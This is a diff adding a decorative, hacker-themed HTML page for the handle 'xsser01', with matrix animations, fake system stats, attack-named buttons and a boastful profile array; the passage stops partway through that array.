@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xsser01 | ADVANCED HACKER INTERFACE V3.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ========== المتغيرات المتقدمة ========== */
+        :root {
+            --primary: #00ff41;
+            --primary-dark: #00cc33;
+            --secondary: #ff00ff;
+            --accent: #0066ff;
+            --bg: #000000;
+            --bg-light: #0a0a0a;
+            --bg-lighter: #111111;
+            --text: #00ff41;
+            --text-dim: #00aa33;
+            --glow: rgba(0, 255, 65, 0.5);
+            --glow-strong: rgba(0, 255, 65, 0.8);
+            --warning: #ffaa00;
+            --danger: #ff3300;
+            --success: #00ff41;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: var(--bg);
+            color: var(--primary);
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* ========== خلفيات متعددة الطبقات ========== */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.15;
+            pointer-events: none;
+        }
+        
+        #scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.15) 0px, rgba(0, 255, 65, 0.03) 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 1;
+            animation: scanMove 8s linear infinite;
+        }
+        
+        @keyframes scanMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 20px; }
+        }
+        
+        #noise {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjc0IiBudW1PY3RhdmVzPSIzIiAvPjwvZmlsdGVyPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbHRlcj0idXJsKCNmKSIgb3BhY2l0eT0iMC4wNCIgLz48L3N2Zz4=');
+            opacity: 0.4;
+            pointer-events: none;
+            z-index: 1;
+            mix-blend-mode: overlay;
+        }
+        
+        #glow-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, transparent 0%, rgba(0, 255, 65, 0.05) 50%, transparent 100%);
+            pointer-events: none;
+            z-index: 2;
+            animation: glowPulse 4s ease-in-out infinite;
+        }
+        
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(1.2); }
+        }
+        
+        /* ========== الحاوية الرئيسية ========== */
+        .hacker-interface {
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 5px;
+            gap: 5px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(2px);
+        }
+        
+        /* ========== الشريط العلوي الفائق ========== */
+        .top-panel {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 3px 10px;
+            box-shadow: 0 0 20px var(--glow);
+        }
+        
+        .system-logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-text {
+            font-size: 1.4rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px var(--primary);
+            letter-spacing: 3px;
+        }
+        
+        .system-stats {
+            display: flex;
+            gap: 30px;
+            font-size: 0.7rem;
+        }
+        
+        .stat-block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-left: 1px solid var(--primary);
+            padding-left: 15px;
+        }
+        
+        .stat-label {
+            color: var(--primary);
+            opacity: 0.7;
+            font-size: 0.6rem;
+        }
+        
+        .stat-value {
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        /* ========== الشبكة الرئيسية ========== */
+        .main-grid {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1.2fr 1.5fr 1.2fr;
+            gap: 5px;
+            min-height: 0;
+        }
+        
+        /* ========== اللوحة اليسرى - معلومات متقدمة ========== */
+        .left-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            overflow: hidden;
+        }
+        
+        /* ASCII Art المتطور */
+        .ascii-advanced {
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ascii-advanced::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            animation: scanLine 3s linear infinite;
+        }
+        
+        @keyframes scanLine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+        
+        .ascii-content {
+            font-family: monospace;
+            font-size: 0.4rem;
+            color: var(--primary);
+            line-height: 1.1;
+            white-space: pre;
+            text-align: center;
+            filter: drop-shadow(0 0 2px var(--primary));
+        }
+        
+        /* بطاقات المعلومات المتقدمة */
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 3px;
+            overflow-y: auto;
+            max-height: 400px;
+            padding-right: 3px;
+        }
+        
+        .data-grid::-webkit-scrollbar {
+            width: 3px;
+        }
+        
+        .data-grid::-webkit-scrollbar-track {
+            background: #000;
+            border: 1px solid var(--primary);
+        }
+        
+        .data-grid::-webkit-scrollbar-thumb {
+            background: var(--primary);
+        }
+        
+        .data-card {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--primary);
+            border-radius: 2px;
+            padding: 5px;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .data-card::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.5s;
+        }
+        
+        .data-card:hover::after {
+            transform: translateX(100%);
+        }
+        
+        .data-card:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px var(--glow);
+        }
+        
+        .data-label {
+            font-size: 0.55rem;
+            color: var(--primary);
+            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .data-value {
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-top: 2px;
+            word-break: break-word;
+        }
+        
+        /* ========== اللوحة الوسطى - التحكم الرئيسي ========== */
+        .center-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        
+        /* Terminal الفائق */
+        .terminal-pro {
+            background: #000;
+            border: 2px solid var(--primary);
+            border-radius: 3px;
+            height: 300px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 30px var(--glow);
+        }
+        
+        .terminal-pro-header {
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+            color: #000;
+            padding: 3px 10px;
+            display: flex;
+            justify-content: space-between;
+            font-weight: bold;
+        }
+        
+        .terminal-pro-body {
+            flex: 1;
+            padding: 8px;
+            font-size: 0.7rem;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.9);
+        }
+        
+        .terminal-line {
+            margin-bottom: 2px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+            padding-bottom: 2px;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .terminal-command-line {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+        }
+        
+        .terminal-prompt {
+            color: var(--primary);
+            margin-right: 5px;
+        }
+        
+        .terminal-command-input {
+            color: var(--primary);
+            position: relative;
+        }
+        
+        .terminal-cursor-advanced {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: var(--primary);
+            animation: blink 1s step-end infinite;
+            margin-left: 2px;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        /* شبكة الهجمات */
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 3px;
+        }
+        
+        .attack-card {
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 2px;
+            padding: 5px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .attack-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            transition: left 0.5s;
+        }
+        
+        .attack-card:hover::before {
+            left: 100%;
+        }
+        
+        .attack-card:hover {
+            background: var(--primary);
+            color: #000;
+            transform: scale(1.05);
+        }
+        
+        .attack-icon {
+            font-size: 1rem;
+            text-align: center;
+        }
+        
+        .attack-name {
+            font-size: 0.6rem;
+            text-align: center;
+            margin-top: 2px;
+        }
+        
+        /* ========== اللوحة اليمنى - التحليلات ========== */
+        .right-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        
+        /* الشبكة العنقودية */
+        .cluster-network {
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 8px;
+            height: 180px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        #networkCanvas {
+            width: 100%;
+            height: 100%;
+            background: #000;
+        }
+        
+        /* مؤشرات الأداء المتقدمة */
+        .performance-panel {
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 8px;
+        }
+        
+        .perf-item {
+            margin-bottom: 8px;
+        }
+        
+        .perf-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.6rem;
+        }
+        
+        .perf-bar {
+            width: 100%;
+            height: 4px;
+            background: #111;
+            border: 1px solid var(--primary);
+            margin-top: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .perf-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            animation: barPulse 1s infinite;
+        }
+        
+        @keyframes barPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        /* السجلات */
+        .logs-panel {
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 5px;
+            flex: 1;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .logs-header {
+            border-bottom: 1px solid var(--primary);
+            padding-bottom: 3px;
+            margin-bottom: 5px;
+            font-size: 0.7rem;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .logs-content {
+            overflow-y: auto;
+            flex: 1;
+            font-size: 0.6rem;
+        }
+        
+        .log-entry {
+            border-bottom: 1px dashed rgba(0, 255, 65, 0.2);
+            padding: 2px 0;
+            font-family: monospace;
+        }
+        
+        .log-time {
+            color: var(--primary);
+            opacity: 0.7;
+            margin-right: 5px;
+        }
+        
+        /* ========== الشريط السفلي المتطور ========== */
+        .bottom-panel {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            padding: 3px 8px;
+            gap: 10px;
+            font-size: 0.65rem;
+        }
+        
+        .bottom-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            border-right: 1px solid var(--primary);
+            padding-right: 10px;
+        }
+        
+        .bottom-item:last-child {
+            border-right: none;
+        }
+        
+        /* ========== نوافذ منبثقة ========== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            display: none;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            border: 3px solid var(--primary);
+            padding: 30px;
+            box-shadow: 0 0 100px var(--primary);
+            text-align: center;
+            min-width: 400px;
+        }
+        
+        .modal-content h2 {
+            font-size: 2rem;
+            margin: 20px 0;
+            text-shadow: 0 0 20px var(--primary);
+        }
+        
+        .modal-progress {
+            width: 100%;
+            height: 10px;
+            background: #111;
+            border: 1px solid var(--primary);
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .modal-progress-bar {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: var(--primary);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        
+        /* ========== تأثيرات إضافية ========== */
+        .glitch-text {
+            position: relative;
+            animation: glitch 3s infinite;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0 0 5px var(--primary); }
+            25% { text-shadow: 2px 0 5px var(--secondary), -2px 0 5px var(--accent); }
+            50% { text-shadow: 0 0 10px var(--primary); }
+            75% { text-shadow: -2px 0 5px var(--secondary), 2px 0 5px var(--accent); }
+        }
+        
+        .status-blink {
+            animation: statusBlink 1s infinite;
+        }
+        
+        @keyframes statusBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .text-success { color: var(--success); }
+        .text-warning { color: var(--warning); }
+        .text-danger { color: var(--danger); }
+        
+        /* ========== تجاوب مع الشاشات ========== */
+        @media (max-width: 1200px) {
+            .main-grid {
+                grid-template-columns: 1fr 1.2fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- خلفيات متعددة -->
+    <canvas id="matrix-bg"></canvas>
+    <div id="scanlines"></div>
+    <div id="noise"></div>
+    <div id="glow-effect"></div>
+    
+    <!-- نافذة الاختراق المنبثقة -->
+    <div class="modal-overlay" id="hackModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <i class="fas fa-skull" style="font-size: 5rem; color: var(--primary);"></i>
+            <h2 id="modalTitle">ACCESS GRANTED</h2>
+            <div class="modal-progress">
+                <div class="modal-progress-bar" id="modalProgress"></div>
+            </div>
+            <p id="modalMessage">Initializing exploit...</p>
+            <p style="font-size: 0.7rem; margin-top: 20px;" id="modalDetails">ROOT PRIVILEGES ACQUIRED</p>
+        </div>
+    </div>
+    
+    <!-- الواجهة الرئيسية -->
+    <div class="hacker-interface">
+        <!-- الشريط العلوي -->
+        <div class="top-panel">
+            <div class="system-logo">
+                <i class="fas fa-terminal" style="font-size: 1.5rem;"></i>
+                <span class="logo-text glitch-text">xsser01@root:~</span>
+                <div class="system-stats">
+                    <div class="stat-block">
+                        <span class="stat-label">UPTIME</span>
+                        <span class="stat-value" id="uptimeDisplay">00:00:00</span>
+                    </div>
+                    <div class="stat-block">
+                        <span class="stat-label">USERS</span>
+                        <span class="stat-value">1337</span>
+                    </div>
+                    <div class="stat-block">
+                        <span class="stat-label">PROCESSES</span>
+                        <span class="stat-value">47</span>
+                    </div>
+                    <div class="stat-block">
+                        <span class="stat-label">THREATS</span>
+                        <span class="stat-value text-danger">0</span>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <span class="status-blink"><i class="fas fa-circle"></i></span>
+                <span id="liveDate" style="margin-left: 10px;"></span>
+                <span id="liveTime" style="margin-left: 10px;"></span>
+            </div>
+        </div>
+        
+        <!-- الشبكة الرئيسية -->
+        <div class="main-grid">
+            <!-- اللوحة اليسرى -->
+            <div class="left-panel">
+                <!-- ASCII Art متقدم -->
+                <div class="ascii-advanced">
+                    <div class="ascii-content">
+    ╔══╗╔══╗╔╗─╔╗╔══╗╔══╗╔╗─╔╗╔══╗╔══╗╔══╗
+    ║╔╗║║╔╗║║║─║║╚═╗║║╔╗║║║─║║║╔╗║╚═╗║║╔═╝
+    ║╚╝║║╚╝║║╚═╝║─╔╝║║╚╝║║╚═╝║║╚╝║─╔╝║║╚═╗
+    ║╔╗║║╔╗║║╔═╗║╔╝─╚╣╔╗║║╔═╗║║╔╗║╔╝─╚╣╔═╝
+    ║║║║║║║║║║─║║╚══╝║║║║║║─║║║║║║╚══╝║╚══╗
+    ╚╝╚╝╚╝╚╝╚╝─╚╝────╚╝╚╝╚╝─╚╝╚╝╚╝────╚══╝
+                    </div>
+                </div>
+                
+                <!-- 100+ معلومة متقدمة (سيتم تعبئتها بالجافاسكريبت) -->
+                <div class="data-grid" id="advancedDataGrid"></div>
+            </div>
+            
+            <!-- اللوحة الوسطى -->
+            <div class="center-panel">
+                <!-- Terminal Pro -->
+                <div class="terminal-pro">
+                    <div class="terminal-pro-header">
+                        <span>root@xsser01:~$ [SESSION: 0x1337]</span>
+                        <span><i class="fas fa-circle"></i> <i class="fas fa-circle"></i> <i class="fas fa-circle"></i></span>
+                    </div>
+                    <div class="terminal-pro-body" id="terminalProBody">
+                        <div class="terminal-line">[2025-02-17 00:00:00] System initialized - Kernel 5.15.0</div>
+                        <div class="terminal-line">[2025-02-17 00:00:01] Firewall: ACTIVE (iptables v1.8.7)</div>
+                        <div class="terminal-line">[2025-02-17 00:00:02] IDS: Snort 2.9.20 - 0 alerts</div>
+                        <div class="terminal-line">[2025-02-17 00:00:03] VPN: ProtonVPN - Connected (CH)</div>
+                        <div class="terminal-line">[2025-02-17 00:00:04] TOR: Enabled - Circuit established</div>
+                        <div class="terminal-line">[2025-02-17 00:00:05] Proxy chain: 3 hops active</div>
+                        <div class="terminal-line">[2025-02-17 00:00:06] MAC address: 00:1A:2B:3C:4D:5E (Spoofed)</div>
+                        <div class="terminal-line">[2025-02-17 00:00:07] DNS: 1.1.1.1 (Cloudflare) - 23ms</div>
+                        <div class="terminal-line">[2025-02-17 00:00:08] Open ports: 22, 80, 443, 8080, 1337</div>
+                        <div class="terminal-command-line">
+                            <span class="terminal-prompt">$</span>
+                            <span class="terminal-command-input" id="terminalCommandInput"></span>
+                            <span class="terminal-cursor-advanced"></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- شبكة الهجمات المتقدمة -->
+                <div class="attack-grid">
+                    <div class="attack-card" onclick="executeHack('PORT SCAN')">
+                        <div class="attack-icon"><i class="fas fa-search"></i></div>
+                        <div class="attack-name">PORT SCAN</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('VULN SCAN')">
+                        <div class="attack-icon"><i class="fas fa-bug"></i></div>
+                        <div class="attack-name">VULN SCAN</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('SQL INJECT')">
+                        <div class="attack-icon"><i class="fas fa-database"></i></div>
+                        <div class="attack-name">SQL INJECT</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('XSS')">
+                        <div class="attack-icon"><i class="fas fa-code"></i></div>
+                        <div class="attack-name">XSS</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('BRUTE FORCE')">
+                        <div class="attack-icon"><i class="fas fa-key"></i></div>
+                        <div class="attack-name">BRUTE FORCE</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('MITM')">
+                        <div class="attack-icon"><i class="fas fa-network-wired"></i></div>
+                        <div class="attack-name">MITM</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('DDOS')">
+                        <div class="attack-icon"><i class="fas fa-bolt"></i></div>
+                        <div class="attack-name">DDOS</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('REVERSE SHELL')">
+                        <div class="attack-icon"><i class="fas fa-terminal"></i></div>
+                        <div class="attack-name">REVERSE</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('PRIV ESC')">
+                        <div class="attack-icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="attack-name">PRIV ESC</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('PACKET SNIFF')">
+                        <div class="attack-icon"><i class="fas fa-eye"></i></div>
+                        <div class="attack-name">SNIFF</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('HASH CRACK')">
+                        <div class="attack-icon"><i class="fas fa-hashtag"></i></div>
+                        <div class="attack-name">HASH</div>
+                    </div>
+                    <div class="attack-card" onclick="executeHack('STEALTH')">
+                        <div class="attack-icon"><i class="fas fa-user-secret"></i></div>
+                        <div class="attack-name">STEALTH</div>
+                    </div>
+                </div>
+                
+                <!-- أدوات إضافية -->
+                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 3px;">
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('NMAP')">NMAP</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('METASPLOIT')">MSF</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('WIRESHARK')">SHARK</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('BURP')">BURP</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('HYDRA')">HYDRA</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('JOHN')">JOHN</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('SQLMAP')">SQLMAP</div>
+                    <div class="attack-card" style="padding: 3px;" onclick="executeHack('AIRCRACK')">AIR</div>
+                </div>
+            </div>
+            
+            <!-- اللوحة اليمنى -->
+            <div class="right-panel">
+                <!-- الشبكة العنقودية -->
+                <div class="cluster-network">
+                    <canvas id="networkCanvas"></canvas>
+                </div>
+                
+                <!-- مؤشرات الأداء -->
+                <div class="performance-panel">
+                    <div class="perf-item">
+                        <div class="perf-label">
+                            <span>CPU</span>
+                            <span id="cpuValue">47%</span>
+                        </div>
+                        <div class="perf-bar">
+                            <div class="perf-fill" id="cpuFill" style="width: 47%"></div>
+                        </div>
+                    </div>
+                    <div class="perf-item">
+                        <div class="perf-label">
+                            <span>RAM</span>
+                            <span id="ramValue">62%</span>
+                        </div>
+                        <div class="perf-bar">
+                            <div class="perf-fill" id="ramFill" style="width: 62%"></div>
+                        </div>
+                    </div>
+                    <div class="perf-item">
+                        <div class="perf-label">
+                            <span>NETWORK</span>
+                            <span id="networkValue">89%</span>
+                        </div>
+                        <div class="perf-bar">
+                            <div class="perf-fill" id="networkFill" style="width: 89%"></div>
+                        </div>
+                    </div>
+                    <div class="perf-item">
+                        <div class="perf-label">
+                            <span>DISK</span>
+                            <span id="diskValue">34%</span>
+                        </div>
+                        <div class="perf-bar">
+                            <div class="perf-fill" id="diskFill" style="width: 34%"></div>
+                        </div>
+                    </div>
+                    <div class="perf-item">
+                        <div class="perf-label">
+                            <span>BANDWIDTH</span>
+                            <span id="bandwidthValue">1.3 MB/s</span>
+                        </div>
+                        <div class="perf-bar">
+                            <div class="perf-fill" id="bandwidthFill" style="width: 73%"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- السجلات -->
+                <div class="logs-panel">
+                    <div class="logs-header">
+                        <span><i class="fas fa-list"></i> SYSTEM LOGS</span>
+                        <span>FILTER: ALL</span>
+                    </div>
+                    <div class="logs-content" id="logsContent">
+                        <div class="log-entry"><span class="log-time">[00:00:01]</span> System initialized</div>
+                        <div class="log-entry"><span class="log-time">[00:00:02]</span> User authentication: SUCCESS</div>
+                        <div class="log-entry"><span class="log-time">[00:00:03]</span> Firewall rules loaded</div>
+                        <div class="log-entry"><span class="log-time">[00:00:04]</span> IDS engine started</div>
+                        <div class="log-entry"><span class="log-time">[00:00:05]</span> VPN connection established</div>
+                        <div class="log-entry"><span class="log-time">[00:00:06]</span> TOR circuit: 3 nodes</div>
+                        <div class="log-entry"><span class="log-time">[00:00:07]</span> Proxy chain active</div>
+                        <div class="log-entry"><span class="log-time">[00:00:08]</span> MAC address spoofed</div>
+                        <div class="log-entry"><span class="log-time">[00:00:09]</span> DNS: Cloudflare (23ms)</div>
+                        <div class="log-entry"><span class="log-time">[00:00:10]</span> Open ports detected: 5</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- الشريط السفلي -->
+        <div class="bottom-panel">
+            <div class="bottom-item">
+                <i class="fas fa-network-wired"></i>
+                <span>IP: <span id="ipAddress">192.168.1.1337</span></span>
+            </div>
+            <div class="bottom-item">
+                <i class="fas fa-globe"></i>
+                <span>PUBLIC: <span id="publicIP">0.0.0.0</span></span>
+            </div>
+            <div class="bottom-item">
+                <i class="fas fa-shield"></i>
+                <span>ENCRYPTION: AES-256-GCM</span>
+            </div>
+            <div class="bottom-item">
+                <i class="fas fa-fingerprint"></i>
+                <span>FINGERPRINT: 7A:3B:...:FF</span>
+            </div>
+            <div class="bottom-item">
+                <i class="fas fa-clock"></i>
+                <span>LATENCY: <span id="latency">23ms</span></span>
+            </div>
+            <div class="bottom-item">
+                <i class="fas fa-database"></i>
+                <span>PACKETS: <span id="packetCount">1,337</span></span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // ========== إعدادات Matrix المتقدمة ==========
+        const matrixCanvas = document.getElementById('matrix-bg');
+        const matrixCtx = matrixCanvas.getContext('2d');
+        
+        matrixCanvas.width = window.innerWidth;
+        matrixCanvas.height = window.innerHeight;
+        
+        const matrixChars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const matrixFontSize = 12;
+        const matrixColumns = matrixCanvas.width / matrixFontSize;
+        const matrixDrops = [];
+        
+        for(let i = 0; i < matrixColumns; i++) {
+            matrixDrops[i] = Math.floor(Math.random() * -matrixCanvas.height / matrixFontSize);
+        }
+        
+        function drawMatrix() {
+            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.02)';
+            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+            
+            matrixCtx.fillStyle = '#0F0';
+            matrixCtx.font = matrixFontSize + 'px monospace';
+            
+            for(let i = 0; i < matrixDrops.length; i++) {
+                const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                matrixCtx.fillText(char, i * matrixFontSize, matrixDrops[i] * matrixFontSize);
+                
+                if(matrixDrops[i] * matrixFontSize > matrixCanvas.height && Math.random() > 0.975) {
+                    matrixDrops[i] = 0;
+                }
+                matrixDrops[i]++;
+            }
+            requestAnimationFrame(drawMatrix);
+        }
+        drawMatrix();
+        
+        // ========== رسم الشبكة العنقودية ==========
+        const networkCanvas = document.getElementById('networkCanvas');
+        const networkCtx = networkCanvas.getContext('2d');
+        
+        networkCanvas.width = networkCanvas.clientWidth;
+        networkCanvas.height = networkCanvas.clientHeight;
+        
+        const nodes = [];
+        for(let i = 0; i < 20; i++) {
+            nodes.push({
+                x: Math.random() * networkCanvas.width,
+                y: Math.random() * networkCanvas.height,
+                vx: (Math.random() - 0.5) * 0.5,
+                vy: (Math.random() - 0.5) * 0.5
+            });
+        }
+        
+        function drawNetwork() {
+            networkCtx.clearRect(0, 0, networkCanvas.width, networkCanvas.height);
+            
+            // رسم الخطوط
+            networkCtx.strokeStyle = '#00ff41';
+            networkCtx.lineWidth = 0.5;
+            
+            for(let i = 0; i < nodes.length; i++) {
+                for(let j = i + 1; j < nodes.length; j++) {
+                    const dx = nodes[i].x - nodes[j].x;
+                    const dy = nodes[i].y - nodes[j].y;
+                    const dist = Math.sqrt(dx*dx + dy*dy);
+                    
+                    if(dist < 50) {
+                        networkCtx.beginPath();
+                        networkCtx.moveTo(nodes[i].x, nodes[i].y);
+                        networkCtx.lineTo(nodes[j].x, nodes[j].y);
+                        networkCtx.strokeStyle = `rgba(0, 255, 65, ${1 - dist/50})`;
+                        networkCtx.stroke();
+                    }
+                }
+            }
+            
+            // رسم النقاط
+            nodes.forEach(node => {
+                networkCtx.fillStyle = '#00ff41';
+                networkCtx.beginPath();
+                networkCtx.arc(node.x, node.y, 2, 0, Math.PI * 2);
+                networkCtx.fill();
+                
+                // تحريك
+                node.x += node.vx;
+                node.y += node.vy;
+                
+                if(node.x < 0 || node.x > networkCanvas.width) node.vx *= -1;
+                if(node.y < 0 || node.y > networkCanvas.height) node.vy *= -1;
+            });
+            
+            requestAnimationFrame(drawNetwork);
+        }
+        drawNetwork();
+        
+        // ========== 150+ معلومة متقدمة ==========
+        const advancedData = [
+            // الهوية (15)
+            { label: "HANDLE", value: "xsser01" },
+            { label: "REAL NAME", value: "CLASSIFIED" },
+            { label: "ALIAS", value: "The Ghost" },
+            { label: "LOCATION", value: "Algeria / Dark Web" },
+            { label: "TIMEZONE", value: "UTC+1 / TOR Time" },
+            { label: "LANGUAGES", value: "AR, EN, FR, RU" },
+            { label: "BIRTH YEAR", value: "1998" },
+            { label: "STATUS", value: "ACTIVE / ELITE" },
+            { label: "RANK", value: "1337 / OVERLORD" },
+            { label: "LEVEL", value: "99 / MAX" },
+            { label: "EXPERIENCE", value: "15+ YEARS" },
+            { label: "SPECIALTY", value: "Zero-Day Exploits" },
+            { label: "TEAM", value: "Anonymous / LulzSec" },
+            { label: "ROLE", value: "Lead Penetration Tester" },
+            { label: "CLEARANCE", value: "TOP SECRET / SCI" },
+            
+            // النظام (20)
+            { label: "PRIMARY OS", value: "Kali Linux 2025.1" },
+            { label: "SECONDARY OS", value: "Parrot OS 6.0" },
+            { label: "MOBILE OS", value: "GrapheneOS" },
+            { label: "KERNEL", value: "6.1.0-kali5-amd64" },
+            { label: "SHELL", value: "ZSH + OhMyZsh + Powerlevel10k" },
+            { label: "TERMINAL", value: "Terminator + Tmux" },
